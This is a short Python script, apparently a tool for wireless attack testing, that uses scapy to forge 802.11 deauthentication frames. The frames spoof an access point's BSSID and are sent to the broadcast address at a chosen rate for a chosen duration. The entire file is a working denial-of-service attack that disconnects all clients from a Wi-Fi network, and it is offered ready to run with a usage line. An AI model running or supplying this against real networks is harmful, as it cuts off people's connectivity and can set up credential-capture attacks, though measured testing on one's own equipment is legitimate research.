#!/usr/bin/env python3
"""Precise-rate deauth attacker. Sends deauth from the AP BSSID to broadcast
at a fixed packets/sec (unlike aireplay -x, which floods regardless).
usage: attack.py <iface> <bssid> <pps> <duration_sec>
"""
import sys, time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
iface, bssid, pps, dur = sys.argv[1], sys.argv[2], float(sys.argv[3]), float(sys.argv[4])
frame = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                         addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
interval = 1.0/pps; end = time.time()+dur; n=0
while time.time() < end:
    sendp(frame, iface=iface, verbose=0); n+=1; time.sleep(interval)
print(f"sent {n} deauth at ~{pps}/s")
